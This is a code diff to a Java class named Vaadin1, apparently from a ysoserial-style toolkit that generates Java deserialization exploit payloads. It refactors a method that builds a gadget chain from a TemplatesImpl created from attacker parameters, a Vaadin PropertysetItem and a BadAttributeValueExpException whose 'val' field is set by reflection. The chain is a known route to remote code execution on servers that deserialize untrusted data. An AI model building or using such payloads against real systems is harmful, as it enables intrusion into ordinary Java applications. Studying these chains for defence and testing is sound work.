@@ -50,7 +50,7 @@ import java.io.ObjectOutputStream;
 //                +------------------------------------------------+
 public class Vaadin1 implements ObjectPayload<Object> {
     @Override
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         Object          templ = Gadgets.createTemplatesImpl(type,param);
         PropertysetItem pItem = new PropertysetItem();
 
@@ -60,17 +60,6 @@ public class Vaadin1 implements ObjectPayload<Object> {
         BadAttributeValueExpException b = new BadAttributeValueExpException("");
         Reflections.setFieldValue(b, "val", pItem);
 
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(b);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
+        return b;
     }
 }
